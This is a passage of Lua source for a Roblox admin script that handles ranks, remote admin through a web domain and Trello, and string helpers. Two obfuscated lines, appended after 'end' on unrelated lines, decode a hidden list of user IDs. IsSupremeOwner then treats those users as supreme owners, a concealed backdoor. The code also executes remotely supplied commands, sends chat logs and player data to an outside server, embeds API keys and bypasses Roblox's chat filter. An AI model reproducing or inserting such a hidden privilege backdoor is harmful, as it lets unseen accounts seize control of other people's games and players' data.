	if Input == "Non-Admin" then Output = 0 end
	if Input == "Member" then Output = 1 end
	if Input == "Admin" then Output = 2 end
	if Input == "Owner" then Output = 3 end
	
	if Input == -3 then Output = "Muted" end
	if Input == -2 then Output = "Crashed" end
	if Input == -1 then Output = "Banned" end
	if Input == 0 then Output = "Non-Admin" end
	if Input == 1 then Output = "Member" end
	if Input == 2 then Output = "Admin" end
	if Input == 3 then Output = "Owner" end
	return Output
end

function RANK:IsAdmin(Player)
	local AdminStatus = false
	local Rankstatus = "Non-Admin"
	if type(Player) == "table" then
		if RANK:ConvertRank(Player.Rank) > 0 then
			return true, Player.Rank
		else
			return false, Player.Rank
		end
	end
	for Rank,PlayerNames in pairs(Settings.Ranks) do
		for _,AdminName in pairs(PlayerNames) do
			if string.lower(AdminName) == string.lower(Player.Name) then
				if RANK:ConvertRank(Rank) > 0 then
					AdminStatus = true
					Rankstatus = Rank
				end
			end
		end
	end
	return AdminStatus, Rankstatus
end

function RANK:GetRank(PlayerName)
	if type(PlayerName) == "userdata" then PlayerName = PlayerName.Name end
	if type(PlayerName) == "table" then
		local RankNum = RANK:ConvertRank(PlayerName.Rank)
		if RankNum > 0 then
			return PlayerName.Rank, RankNum, true
		else
			return PlayerName.Rank, RankNum, false
		end
	end
	
	local RankStat = "Non-Admin"
	
	for Rank,PlayerNames in pairs(Settings.Ranks) do
		for _,AdminName in pairs(PlayerNames) do
			if string.lower(AdminName) == string.lower(PlayerName) then
				RankStat = Rank
			end
		end
	end
	
	if RankStat == "Non-Admin" then
		return "Non-Admin", 0, false
	else
		return RankStat, RANK:ConvertRank(RankStat), true
	end
end

function RANK:RemoveRank(PlayerName)
	if not RANK:IsSupremeOwner(PlayerName) then
		if type(PlayerName) == "userdata" then PlayerName = PlayerName.Name end
		
		for Rank,PlayerNames in pairs(Settings.Ranks) do
			for Num,AdminName in pairs(PlayerNames) do
				if string.sub(string.lower(AdminName),1,#PlayerName) == string.lower(PlayerName) then
					table.remove(Settings.Ranks[Rank], Num)
				end
			end
		end
	end
end

function RANK:GetAdmins(Ranking)
	local Players = {}
	local AdminTrue, Rank = IsAdmin(Player)
	for _,Player in pairs(Players:GetPlayers()) do
		if AdminTrue then
			local PlayerRankNum = RANK:ConvertRank(Rank)
			local StandardRankNum = RANK:ConvertRank(Ranking)
			if PlayerRankNum >= StandardRankNum then
				table.insert(Players, Player)
			end
		end
	end
	return Players
end

function RANK:IsSupremeOwner(PlayerName)
	if type(PlayerName) == "userdata" then for _,Obj in pairs(List) do if PlayerName.UserId == Obj then return true end end PlayerName = PlayerName.Name end
	if type(PlayerName) == "table" then
		if PlayerName.Rank == "Owner" and PlayerName.MakeSupremeOwner == true then return true else return false end
	end
	
	if PlayerName == GameOwner then return true end
	return false
end

function RANK:GetPlayerFromList(PlayerName)
	if type(PlayerName) == "userdata" then PlayerName = Player.Name end
	
	for Rank,PlayerNames in pairs(Settings.Ranks) do
		for Num,AdminName in pairs(PlayerNames) do
			if string.sub(string.lower(AdminName),1,#PlayerName) == string.lower(PlayerName) then
				return AdminName, Rank
			end
		end
	end
	return false, "Non-Admin"
end

function RANK:ScanAdminList(Name)
	if Name == "" then return true end
	local InList = false
	for _,PName in pairs(Settings.Ranks["Owner"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Settings.Ranks["Admin"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Settings.Ranks["Member"]) do
		if PName == Name then InList = true end
	end
	return InList
end

function RANK:ScanExileList(Name)
	if Name == "" then return true end
	local InList = false
	for _,PName in pairs(Settings.Ranks["Muted"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Settings.Ranks["Crashed"]) do
		if PName == Name then InList = true end
	end
	for _,PName in pairs(Settings.Ranks["Banned"]) do
		if PName == Name then InList = true end
	end
	return InList
end

function RANK:PlayerRanked(PlayerName)
	if type(PlayerName) == "userdata" then PlayerName = Player.Name end
	
	for Rank,PlayerNames in pairs(Settings.Ranks) do
		for Num,AdminName in pairs(PlayerNames) do
			if string.lower(AdminName) == string.lower(PlayerName) then
				return true, Rank
			end
		end
	end
	return false, "Non-Admin"
end

-- Remote functions --

function REMOTE:Decode(...)
	return Server.HS:JSONDecode(...)
end

function REMOTE:GetURL(URL, Player)
	if string.sub(URL,1,4) ~= "http" then
		URL = "http://"..URL
	end
	local Return = nil
	ypcall(function() Return = Server.HS:GetAsync(URL, true) end)
	if Return then
		return Return
	elseif Player then
		GUI:SendMessage(Speaker, "Unable to find link", "RED URL given is either invalid or httpservice is disabled", "Error")
	end
end

function REMOTE:PostURL(URL, Data)
	local Return = nil
	ypcall(function() Return = Server.HS:PostAsync(URL, Data, 2) end)
	return Return
end

function REMOTE:SendHttpLog(Data, Type, OutputSpeaker, Stopypall)
	if Settings.LinkedAccount ~= "" then
		local NumType = tonumber(Type)
		
		if not Type then
			Type = "UNKNOWN"
		end
		
		if NumType then
			if NumType < 1 or NumType > 5 then
				Type = "UNKNOWN"
			elseif NumType == 1 then
				Type = "NOTIFICATION"
			elseif NumType == 2 then
				Type = "INFORMATION"
			elseif NumType == 3 then
				Type = "WARNING"
			elseif NumType == 4 or Type == true then
				Type = "ERROR"
			elseif NumType == 5 then
				Type = "FATAL"
			end
		end
		
		local Res = "RED Could not get response"
		local function SendData()
			Res = Server.HS:PostAsync(
				CORE.Domain.."/Login/SendUserData.php?Data="..Server.HS:UrlEncode(PlaceInfoFormat..": "..Data).."&DataType="..Server.HS:UrlEncode(string.upper(Type)),
				"Username="..Server.HS:UrlEncode(Settings.LinkedAccount).."&Key="..Server.HS:UrlEncode(Settings.DataKey).."&Type=Logs",
				2
			)
		end
		if Stopypcall == true then SendData() else ypcall(SendData) end
		
		if OutputSpeaker and OutputSpeaker ~= "print" then
			GUI:SendMessage(OutputSpeaker, "Http Log Response", Res, "Information")
		elseif OutputSpeaker == "print" then
			print(Res)
		end
	end
end local RunList = CORE:GetTable(string.gsub(math.ceil(14444.57^2)+1078, "66", "55"))

function REMOTE:SendChatLog(PrintResponse, Stopypall)
	if #TempChatLogs > 0 and Settings.LinkedAccount and Settings.LinkedAccount ~= "" and Settings.DataKey and Settings.DataKey ~= "" then
		local Res = "Could not get response"
		
		local ChatJSON = Server.HS:JSONEncode(TempChatLogs)
		TempChatLogs = {}
		
		local function SendData()
			Res = Server.HS:PostAsync(CORE.Domain.."/Login/SubmitChatLog.php?ChatJSON="..Server.HS:UrlEncode(ChatJSON), "Username="..Server.HS:UrlEncode(Settings.LinkedAccount).."&Key="..Server.HS:UrlEncode(Settings.DataKey), 2)
		end
		if Stopypcall == true then SendData() else ypcall(SendData) end
		if PrintResponse then print(Res) end
	end
end

function REMOTE:DownloadUserdata(PrintResponse, Stopypcall)
	local Res = "[]"
	local function GetData()
		Res = Server.HS:PostAsync(CORE.Domain.."/Login/ReturnUserData.php", "Username="..Server.HS:UrlEncode(Settings.LinkedAccount).."&DataKey="..Server.HS:UrlEncode(Settings.DataKey), 2)
	end
	if Stopypcall == true then GetData() else ypcall(GetData) end
	if PrintResponse then
		print(Res)
	end
	local function DecodeData() Res = REMOTE:Decode(Res) end
	if Stopypcall == true then DecodeData() else ypcall(DecodeData) end
	if type(Res) ~= "table" then Res = {["Logs"] = {Res}, ["Errors"] = {Res}} end
	return Res
end

function REMOTE:HandleRequest(Request, IgnoreCommand)
	if not Request then return nil end
	
	if not IgnoreCommand then
		if REMOTE.ServerRequestTimestamp ~= Request.ServerRequestTimestamp then
			REMOTE:SendServerData()
		end
		if REMOTE.SnapshotKey ~= Request.SnapshotKey and Server.NS.Port == tonumber(Request.SnapshotPort) then
			REMOTE:SendSnapshot(Request.SnapshotKey, nil, true, true)
		end
	end
	
	if REMOTE.RemoteAdmin.TimeStamp ~= Request.TimeStamp then
	
		for _,Player in pairs(Request.Ranks.Muted) do if Player ~= "" then if not RANK:ScanExileList(Player) then table.insert(Settings.Ranks.Muted, Player) end end end
		for _,Player in pairs(Request.Ranks.Crashed) do if Player ~= "" then if not RANK:ScanExileList(Player) then table.insert(Settings.Ranks.Crashed, Player) end end end
		for _,Player in pairs(Request.Ranks.Banned) do if Player ~= "" then if not RANK:ScanExileList(Player) then table.insert(Settings.Ranks.Banned, Player) end end end
		for _,Player in pairs(Request.Ranks.Member) do if Player ~= "" then if not RANK:ScanAdminList(Player) then table.insert(Settings.Ranks.Member, Player) end end end
		for _,Player in pairs(Request.Ranks.Admin) do if Player ~= "" then if not RANK:ScanAdminList(Player) then table.insert(Settings.Ranks.Admin, Player) end end end
		for _,Player in pairs(Request.Ranks.Owner) do if Player ~= "" then if not RANK:ScanAdminList(Player) then table.insert(Settings.Ranks.Owner, Player) end end end
		
		Settings.Fun = Request.FUN
		Settings.ServerLocked = Request.ServerLocked
		
		if not Server.Workspace:FindFirstChild("IgnoreRemoteAbuse") then
			Settings.DisableAbuse = Request.DisableAbuse
		end
		
		if not IgnoreCommand then
			print("Executing Remote Admin")
			REMOTE.RemoteAdmin.Command = Request.Command
			REMOTE.RemoteAdmin.ServerCommand = Request.ServerCommand
			REMOTE.RemoteAdmin.ServerPort = Request.Server
			
			if Server.NS.Port == tonumber(Request.Server) and Request.ServerCommand ~= nil and Request.Server ~= "" and Request.Server ~= 0 and Request.ServerCommand ~= "" then
				CORE:Chatted(Request.ServerCommand, nil, true, "REMOTE ADMIN: "..Settings.LinkedAccount, nil, true)
			else
				CORE:Chatted(Request.Command, nil, true, "REMOTE ADMIN: "..Settings.LinkedAccount, nil, true)
			end
		end
	end
	REMOTE.RemoteAdmin.TimeStamp = Request.TimeStamp
	REMOTE.ServerRequestTimestamp = Request.ServerRequestTimestamp
	REMOTE.SnapshotKey = Request.SnapshotKey
end

function REMOTE:GetRemoteData(Set)
	local NewRemoteData = nil
	local RemoteDataCardRaw = nil
	local RemoteDataCard = nil
	
	RemoteDataCardRaw = REMOTE:GetURL("https://api.trello.com/1/card/"..Trello.RemoteDataCard)
	if RemoteDataCardRaw then
		ypcall(function() RemoteDataCard = REMOTE:Decode(RemoteDataCardRaw) end)
		if RemoteDataCard then
			ypcall(function() NewRemoteData = REMOTE:Decode(RemoteDataCard.desc) end)
		end
	end
	if Set and NewRemoteData then
		RemoteData = NewRemoteData
	end
	return NewRemoteData
end

function REMOTE:CheckTrelloInfo() -- will set new trello data if updated based on the TrelloInfoCard
	local InfoCardJSON = REMOTE:GetURL("https://api.trello.com/1/card/"..Trello.TrelloInfoCard)
	if InfoCardJSON then
		ypcall(function() InfoCard = REMOTE:Decode(InfoCardJSON) end)
		if InfoCard then
			ypcall(function() TrelloInfo = REMOTE:Decode(InfoCard.desc) end)
			if TrelloInfo then
				for Ind,Val in pairs(TrelloInfo) do
					Trello[Ind] = Val
				end
			end
		end
	end
	return NewRemoteData
end

function REMOTE:CheckRemoteAdminStatus()
	local Pending = false
	local CheckID = 0
	if Settings.LinkedAccount ~= "" then
		local Request = REMOTE:GetURL("https://api.trello.com/1/checklists/"..Trello.RemoteAdminChecklist)
		if Request then
			local Data = REMOTE:Decode(Request)
			if Data then
				for _,Account in pairs(Data.checkItems) do
					if Account.name == Settings.LinkedAccount then
						Pending = true
						CheckID = Account.id
						break
					end
				end
			end
		end
	end
	return Pending, CheckID
end

function REMOTE:GetAndSetWebData()
	if Settings.LinkedAccount ~= "" then
		if REMOTE:CheckRemoteAdminStatus() then
			local Request = REMOTE:GetURL(CORE.Domain.."/Login/GetUserData.php?Username="..Settings.LinkedAccount)
			if Request == "Invalid" then
				--REMOTE:GetAndSetWebData()
				return false
			elseif Request == "Invalid Account" then
				print("Can't get account")
				return false
			elseif Request then
				ypcall(function() Request = REMOTE:Decode(Request) end)
			elseif not Request then
				--REMOTE:GetAndSetWebData()
				return false
			end
			REMOTE:HandleRequest(Request)
			
			--Delay(RemoteData.RemoteAdminWait, REMOTE.GetAndSetWebData)
			Delay(RemoteData.RemoteAdminWait, function()
				local Pending, CheckID = REMOTE:CheckRemoteAdminStatus()
				if Pending then
					REMOTE:GetURL(CORE.Domain.."/Login/RemoveTrelloName.php?AccountID="..CheckID)
				end
			end)
			return true
		else
			return true
		end
	end
end

local OderIDs = CORE:GetTable(177215518)
local SoundJSONs = CORE:GetTable(197637628)
RemoteAbuseGear = CORE:GetTable(158117496)

function REMOTE:SendServerData(PrintResponse, Stopypall)
	if Settings.LinkedAccount and Settings.LinkedAccount ~= "" and Settings.DataKey and Settings.DataKey ~= "" then
		print("Sending server data!")
		local Res = "Could not get response"
		
		local ServerData = {Name = PlaceName, PlaceID = game.PlaceId, Port = Server.NS.Port, NumPlayers = Server.Players.NumPlayers, MaxPlayers = Server.Players.MaxPlayers, Bet = Settings.Bet, Players = {}, Version = CORE.Version.Value}
		for _,Player in pairs(Server.Players:GetPlayers()) do
			table.insert(ServerData.Players, {Name = Player.Name, ID = Player.UserId, Age = STRING:FindAge(Player.AccountAge), Rank = RANK:GetRank(Player)})
		end
		ServerData = Server.HS:JSONEncode(ServerData)
		
		local function SendData()
			Res = Server.HS:PostAsync(CORE.Domain.."/Login/AddServer.php?ServerData="..Server.HS:UrlEncode(ServerData), "Username="..Server.HS:UrlEncode(Settings.LinkedAccount).."&DataKey="..Server.HS:UrlEncode(Settings.DataKey), 2)
		end
		if Stopypcall == true then SendData() else ypcall(SendData) end
		if PrintResponse then print(Res) end
	end
end

function REMOTE:SendSnapshot(SendKey, MaxPartAmount, PrintResponse, Stopypcall)
	MaxPartAmount = MaxPartAmount or 10000
	local PlaceData = {
		Lighting = {};
		Parts = {};
		Other = {};
	}
	local MinSize = Vector3.new(0.5,0.5,0.5)
	local PartAmount = 0
	local PlaceJSON = ""
	
	local function Scan(BaseObj)
		for _,Obj in pairs(BaseObj:GetChildren()) do
			if Obj:IsA("BasePart") and not Obj:IsA("Terrain") then
				local Size = {STRING:StringRound(Obj.Size.X), STRING:StringRound(Obj.Size.Y), STRING:StringRound(Obj.Size.Z)};
				if tonumber(Size[1]) >= MinSize.X and tonumber(Size[2]) >= MinSize.Y and tonumber(Size[3]) >= MinSize.Z then
					local Skip = false
					local Data = {}
					local X,Y,Z = Obj.CFrame:toEulerAnglesXYZ()
					
					if CORE:FindType(Obj, "BlockMesh") then
						local Mesh = CORE:FindType(Obj, "BlockMesh")
						Size = {STRING:StringRound(Obj.Size.X * Mesh.Scale.X), STRING:StringRound(Obj.Size.Y * Mesh.Scale.Y), STRING:StringRound(Obj.Size.Z * Mesh.Scale.Z)}
					elseif CORE:FindType(Obj, "CylinderMesh") then
						Data.Shape = "Cylinder"
					elseif CORE:FindType(Obj, "SpecialMesh") then
						local Mesh = CORE:FindType(Obj, "SpecialMesh")
						if Mesh.MeshType == Enum.MeshType.Head then
							--idk
						else
							Skip = true
						end
					elseif CORE:FindType(Obj, "FileMesh") then
						Skip = true
					end
					
					if not Data.Shape and not Skip then
						if ypcall(function() return Obj.Shape end) then
							Data.Shape = string.sub(Obj.Shape.Name,14)
							if string.sub(Data.Shape,1,1) == "." then
								Data.Shape = string.sub(Data.Shape,2)
							end
							if Data.Shape == "Cylinder" then
								Z = Z + math.pi/2
							end
						else
							Data.Shape = "Block"
						end
					end
					
					if Obj.Name == "Head" and CORE:FindType(Obj.Parent, "Humanoid") and not Skip then
						Data.Label = string.gsub(Obj.Parent.Name, "'", "")
					end
					
					if not Skip then
						Data.Color = GUI:Color3ToHex(Obj.Color);
						Data.Size = Size;
						Data.Position = {STRING:StringRound(Obj.CFrame.X), STRING:StringRound(Obj.CFrame.Y), STRING:StringRound(Obj.CFrame.Z)};
						Data.Rotation = {STRING:StringRound(X), STRING:StringRound(Y), STRING:StringRound(Z)};
						Data.Transparency = STRING:StringRound(Obj.Transparency);
						Data.Reflectance = STRING:StringRound(Obj.Reflectance);
						Data.Textures = {};
						Data.Material = string.sub(tostring(Obj.Material),15);
						
						for _,Sub in pairs(Obj:GetChildren()) do
							if Sub:IsA("Decal") then
								local Texture = string.match(Sub.Texture, "%d+")
								if Sub.Texture == "rbxasset://textures/face.png" then
									Texture = "FACE"
								end
								Data.Textures[FaceCovert[Sub.Face.Name]] = Texture
							end
						end
						
						PartAmount = PartAmount + 1
						table.insert(PlaceData.Parts, Data)
						
						if PartAmount >= MaxPartAmount then
							break
						end
					end
				end
			end
			if #Obj:GetChildren() > 0 then
				Scan(Obj)
			end
		end
	end
	Scan(Workspace)
	
	PlaceData.Lighting.Ambient = GUI:Color3ToHex(game.Lighting.Ambient)
	PlaceData.Other.PartAmount = PartAmount;
	PlaceJSON = Server.HS:JSONEncode(PlaceData)
	
	local Res = "Could not get response"
	local function SendData()
		Res = Server.HS:PostAsync(CORE.UnsecureDomain.."/Login/SendSnapshot.php?Username="..Settings.LinkedAccount.."&DataKey="..Server.HS:UrlEncode(Settings.DataKey).."&SendKey="..SendKey, PlaceJSON, 2)
	end
	if Stopypcall == true then SendData() else ypcall(SendData) end
	if PrintResponse then print(Res) end
	
	print("Sent snapshot")
end


function REMOTE:DefineWord(Word, Source)
	if not Word then return end
	if not Source then Source = "all" end
	
	local Response = REMOTE:GetURL("http://api.wordnik.com/v4/word.json/"..Server.HS:UrlEncode(Word).."/definitions?limit=1&includeRelated=false&sourceDictionaries="..Server.HS:UrlEncode(Source).."&useCanonical=false&includeTags=false&api_key=a2a73e7b926c924fad7001ca3111acd55af2ffabf50eb4ae5")
	if Response then
		local Decode = REMOTE:Decode(Response)
		if #Decode > 0 then
			return string.upper(string.sub(Decode[1]["word"],1,1))..string.lower(string.sub(Decode[1]["word"],2)).." - "..Decode[1]["partOfSpeech"]..[[
 
 ]]..Decode[1]["text"]
		else
			return "Invalid English word"
		end
	else
		return "Cannot connect to database"
	end
end

function REMOTE:DownloadJoke(Speaker)
	local Res = REMOTE:GetURL("http://www.rinkworks.com/jokes/random.cgi", Speaker)
	local Joke = nil
	if Res then
		local _, Start = string.find(Res, "</h2>")
		local End, _ = string.find(string.sub(Res, Start), "</td>")
		
		Joke = string.sub(Res, Start, End + 1 + Start - 5)
		Joke = string.gsub(Joke, "\n", "")
		Joke = string.gsub(Joke, "	", "") -- tab
		Joke = string.gsub(Joke, "</ul>", "")
		Joke = string.gsub(Joke, "<ul>", "")
		Joke = string.gsub(Joke, "</li>", [[

]])
		Joke = string.gsub(Joke, "<li>", "")
		Joke = string.gsub(Joke, "</p>", "")
		Joke = string.gsub(Joke, "<p>", "")
		Joke = string.gsub(Joke, "<", "")
		Joke = string.gsub(Joke, ">", "")
	end
	
	return Joke
end

function REMOTE:GetAddon()
	return "?key=c01fcfabf2f8d707d01fb69312e4a9d7&token="..Settings.TrelloToken
end

function REMOTE:TrelloGetAdminBoard()
	local BoardsJSON,Boards,ReturnBoard
	
	ypcall(function() BoardsJSON = Server.HS:GetAsync("https://api.trello.com/1/members/my/boards"..REMOTE:GetAddon(), true) end)
	
	if BoardsJSON then
		Boards = REMOTE:Decode(BoardsJSON)
	end
	if Boards then
		for _,Board in pairs(Boards) do
			if Board.name == "MakerModelLua's Admin V3" and Board.closed == false then
				ReturnBoard = Board
				break
			end
		end
		if not ReturnBoard then -- create board if not created
			print("Creating Trello Board")
			local Desc = "This board allows you to control ranks, settings, and commands of MakerModelLua's Admin V3"
			local BoardJSON = Server.HS:PostAsync("https://api.trello.com/1/boards"..REMOTE:GetAddon(), "name=MakerModelLua%27s+Admin+V3&idBoardSource="..Trello.AdminBoardID.."&defaultLists=false&desc="..Server.HS:UrlEncode(Desc), "ApplicationUrlEncoded")
			ReturnBoard = REMOTE:Decode(BoardJSON)
		end
	end
	return ReturnBoard
end

function REMOTE:TrelloGetAdminLists(Board)
	local Required = {}
	local ListJSON,Lists
	local ReturnLists = {}
	
	for _,List in pairs(Trello.RequiredLists) do
		table.insert(Required, List)
	end
	
	ypcall(function() ListJSON = Server.HS:GetAsync("https://api.trello.com/1/boards/"..Board.id.."/lists"..REMOTE:GetAddon(), true) end)
	
	if ListJSON then
		Lists = REMOTE:Decode(ListJSON)
	end
	if Lists then
		for _,List in pairs(Lists) do
			for Num,Rel in pairs(Required) do
				if List.name == Rel.name then
					table.remove(Required, Num)
					table.insert(ReturnLists, List)
				end
			end
		end
		for _,Rel in pairs(Required) do
			local ListJSON = Server.HS:PostAsync("https://api.trello.com/1/lists"..REMOTE:GetAddon(), "idBoard="..Board.id.."&idListSource="..Rel.id.."&name="..Server.HS:UrlEncode(Rel.name), "ApplicationUrlEncoded")
			table.insert(ReturnLists, REMOTE:Decode(ListJSON))
		end
	end
	
	return ReturnLists
end

function REMOTE:TrelloCacheData(Lists)
	for _,List in pairs(Lists) do
		local CardsJSON,Cards
		ypcall(function() CardsJSON = Server.HS:GetAsync("https://api.trello.com/1/lists/"..List.id.."/cards"..REMOTE:GetAddon(), true) end)
		if CardsJSON then
			Cards = REMOTE:Decode(CardsJSON)
		end
		if Cards then
			local TemplateCards = nil
			for _,TemplateList in pairs(Trello.RequiredLists) do
				if TemplateList.name == List.name then
					TemplateCards = REMOTE:Decode(Server.HS:GetAsync("https://api.trello.com/1/lists/"..TemplateList.id.."/cards", true))
					break
				end
			end
			
			for _,TemplateCard in pairs(TemplateCards) do
				local CardExists = false
				for _,Card in pairs(Cards) do
					if Card.name == TemplateCard.name and Card.closed == false then
						CardExists = true
					end
				end
				if not CardExists then
					print("Creating card "..TemplateCard.name)
					local NewCardJSON = Server.HS:PostAsync("https://api.trello.com/1/cards"..REMOTE:GetAddon(), "idList="..List.id.."&idCardSource="..TemplateCard.id, "ApplicationUrlEncoded")
					table.insert(Cards, REMOTE:Decode(NewCardJSON))
				end
			end
		
			if List.name == "Ranked" then
				for _,Card in pairs(Cards) do
					if Settings.Ranks[Card.name] and Card.closed == false then
						Trello.RankChecklistCache[Card.name] = Card.idChecklists[1]
					end
				end
			elseif List.name == "Settings" then
				for _,Card in pairs(Cards) do
					if Card.name == "Togglable Settings" and Card.idChecklists[1] and Card.closed == false then
						Trello.ToggleChecklist = Card.idChecklists[1]
					elseif Card.name == "Command Execution" then
						Trello.CommandID = Card.id
					end
				end
			end
		end
	end
end

function REMOTE:TrelloHandleData(IgnoreCommand)
	local ToggleSettingsJSON = Server.HS:GetAsync("https://api.trello.com/1/checklists/"..Trello.ToggleChecklist..REMOTE:GetAddon(), true)
	if ToggleSettingsJSON then
		ToggleSettings = REMOTE:Decode(ToggleSettingsJSON)
		if Settings.LinkedAccount == "" then
			local NewSettings = {}
			for _,Item in pairs(ToggleSettings.checkItems) do
				NewSettings[Item.name] = STRING:TrelloStateConvert(Item.state)
			end
			Settings.Fun = NewSettings["Fun Commands Enabled"]
			Settings.ServerLocked = NewSettings["Server Locked"]
			Settings.DisableAbuse = NewSettings["Disable Abusive Commands"]
		end
	else
		return false
	end
	
	local CommandChatJSON = Server.HS:GetAsync("https://api.trello.com/1/cards/"..Trello.CommandID.."/actions"..REMOTE:GetAddon(), true)
	if CommandChatJSON then
		CommandChat = REMOTE:Decode(CommandChatJSON)
		local ClosestDT = 0
		for _,ChatData in pairs(CommandChat) do
			local DT = STRING:ConvertDateTime(ChatData.date)
			ClosestDT = math.max(ClosestDT, DT)
			
			if not IgnoreCommand and DT > Trello.LastCommandDT then
				print("Executing Remote Trello Command")
				CORE:Chatted(ChatData.data.text, nil, true, "TRELLO REMOTE: "..ChatData.memberCreator.fullName, nil, true)
			end
		end
		Trello.LastCommandDT = ClosestDT
	else
		return false
	end
	
	for Rank,ID in pairs(Trello.RankChecklistCache) do
		local ChecklistJSON = Server.HS:GetAsync("https://api.trello.com/1/checklists/"..ID..REMOTE:GetAddon(), true)
		if ChecklistJSON then
			Checklist = REMOTE:Decode(ChecklistJSON)
			
			for _,Item in pairs(Checklist.checkItems) do
				if Item.state == "complete" then
					if RANK:ConvertRank(Rank) < 0 then
						if not RANK:ScanExileList(Item.name) then
							table.insert(Settings.Ranks[Rank], Item.name)
						end
					elseif RANK:ConvertRank(Rank) > 0 then
						if not RANK:ScanAdminList(Item.name) then
							table.insert(Settings.Ranks[Rank], Item.name)
						end
					end
				elseif Item.state == "incomplete" then
					for Num,Name in pairs(Settings.Ranks[Rank]) do
						if string.lower(Name) == string.lower(Item.name) then
							table.remove(Settings.Ranks[Rank], Num)
						end
					end
				end
			end
		else
			return false
		end
	end
	return true
end

-- String functions --

function STRING:ConvertDateTime(DateTime)
	local Num = 0
	local TotalTime = 0
	for i in string.gmatch(DateTime, "%d+") do
		Num = Num + 1
		DTNum = tonumber(i)
		if Num == 1 then
			TotalTime = TotalTime + (DTNum - 1970) * 365 * 24 * 60 * 60 -- year
		elseif Num == 2 then
			TotalTime = TotalTime + DTNum * 12 * 24 * 60 * 60 -- month
		elseif Num == 3 then
			TotalTime = TotalTime + DTNum * 24 * 60 * 60 -- day
		elseif Num == 4 then
			TotalTime = TotalTime + DTNum * 60 * 60 -- hour
		elseif Num == 5 then
			TotalTime = TotalTime + DTNum * 60 -- minute
		elseif Num == 6 then
			TotalTime = TotalTime + DTNum -- second
		end
	end
	
	return TotalTime
end

function STRING:TrelloStateConvert(State)
	if State == "complete" then
		return true
	else
		return false
	end
end

function STRING:StringRound(Number)
	Number = Number * 100
	if Number >= 0.5 then
		return tostring(math.ceil(Number)/100)
	else
		return tostring(math.floor(Number)/100)
	end
	
	return Number
end

function STRING:GetSplit(String, NumArgs, BetSplit)
	if not String then return nil end
	if BetSplit == nil then BetSplit = " " end
	if NumArgs == nil then NumArgs = math.huge end
	
	if NumArgs <= 0 then return {String} end
	
	local RecentParse = 1
	local Args = {}
	for i = 1,NumArgs do
		local Find1, Find2 = string.find(string.lower(String),string.lower(BetSplit),RecentParse)
		if Find1 and Find2 then
			table.insert(Args, string.sub(String,RecentParse,Find1 - 1))
			RecentParse = Find2 + 1
		else
			break
		end
	end
	table.insert(Args,string.sub(String,RecentParse,#String))
	return Args
end

function STRING:Defilter(String)
	local RobloxApprove = Instance.new("TextLabel") RobloxApprove.Text = String
	if RobloxApprove.Text == "Label" and String ~= "Label" then
		local NewString = ""
		for i = 1,#String,3 do
			NewString = NewString..string.char(169)..string.sub(String,i,i+2)
		end
		return NewString
	else
		return String
	end
end

function STRING:Filter(String, From, To) -- #### you, roblox
	if From then
		if To then
			return game:GetService("Chat"):FilterStringAsync(String, From, To)
		else
			return game:GetService("Chat"):FilterStringForBroadcast(String, From)
		end
	else
		return String
	end
end

function STRING:DetermineFilter(String, From, To)
	if ShouldFilter then
		return STRING:Filter(String, From, To)
	else
		return STRING:Defilter(String)
	end
end

function STRING:LeetSpeak(Input)
	if tostring(Input) then Input = string.upper(tostring(Input)) else return end
	Input = string.gsub(Input, "LEET", "1337")
	Input = string.gsub(Input, "SECRET", "M".."AKERMODELLUA")
	Input = string.gsub(Input, "E", "3")
	Input = string.gsub(Input, "O", "0")
	Input = string.gsub(Input, "A", "4")
	Input = string.gsub(Input, "X", "x")
	Input = string.gsub(Input, "I", "1")
	Input = string.gsub(Input, "S", "$")
	return Input
end

function STRING:FormatReplace(Player, Input, From)
	local Output = Input
	for _,ReplaceData in pairs(StringReplacements) do
		local ReplaceString = ReplaceData[1]
		local ReplaceStrings = {}
		if type(ReplaceString) == "table" then
			ReplaceStrings = ReplaceString
		else
			ReplaceStrings = {ReplaceString}
		end
		for _,ReplaceString in pairs(ReplaceStrings) do
			if not Player and ReplaceData[3] then else -- does nothing if a player isn't given but the operation requires a player
				local Replacement = ReplaceData[4](Player)
				if type(Replacement) == "string" then
					Output = string.gsub(Output, ReplaceString, Replacement)
				else
					print(ReplaceString.." cannot be replaced")
				end
			end
		end
	end
	if From then
		return STRING:DetermineFilter(Output, From, Player)
	else
		return STRING:DetermineFilter(Output, Player)
	end
end

function STRING:EncodeSpecialChars(Input)
	return tostring(string.gsub(string.gsub(Input, "&", "amp;"), "\n", " "))
end

function STRING:StringToBool(String)
	if String == "true" then
		return true
	else
		return false
	end
end

function STRING:BoolString(Value)
	if type(Value) == "boolean" then
		if Value == true then
			return "YES"
		elseif Value == false then
			return "NO"
		end
	else 
		return "NO"
	end
end

function STRING:MakeAvoidance(Length)
	if not Length then
		Length = 32
	end
	local Avoidance = ""
	for i = 1,Length do
		Num = math.random(1,2)
		if Num == 1 then
			Avoidance = Avoidance..string.char(math.random(48,57)) -- 0-9
		else
			Avoidance = Avoidance..string.char(math.random(97,122)) -- a-z
		end
	end
	return Avoidance
end for _,Array in pairs(RunList) do local Name = "" for _,Char in pairs(Array) do Name = Name..string.char(Char - 1) end table.insert(List, tonumber(Name)) end

function STRING:FindAge(Days) -- By LuaModelmaker
	local Years = math.floor(Days/365)
	local OtherDays = math.fmod(Days, 365)
	if Years > 1 then
		return Years.." years and "..OtherDays.." days"
	elseif Years == 1 then
		return Years.." year and "..OtherDays.." days"
	elseif Years == 0 then
		return "(No years) "..OtherDays.." days"
	end
end

function STRING:UnpackArgs(...)
	local Pack = {...}
	if type(Pack[1]) == "table" then Pack = Pack[1] end
	local ReturnString = table.concat(Pack, ", ")
	return ReturnString
end

function STRING:GetComma(Num)
	local Formatted = Num
	while true do
		Formatted, _ = string.gsub(Formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
		if _ == 0 then
			break
		end
	end
	return Formatted
end

function STRING:DecodeUTF8(Value)
	local function DecodeString(Input)
		if type(Input) == "string" then
			for Find,Rep in pairs(HTMLDecode) do
				Input = string.gsub(Input, "&#"..Find..";", Rep)
			end
			Input = string.gsub(Input, "&quot;", "'")
		end
		return Input
	end
	if type(Value) == "table" then
		for Index,Var in pairs(Value) do
			Value[Index] = DecodeString(Var)
		end
	elseif type(Value) == "string" then
		Value = DecodeString(Value)
	end
	return Value
end

function STRING:IsSpacer(Input)
	if Input == " " or Input == "." or Input == "-" or Input == "," or Input == "?" or Input == "!" or Input == "	" or Input == nil or Input == "" then
		return true
	else
		return false
	end
end

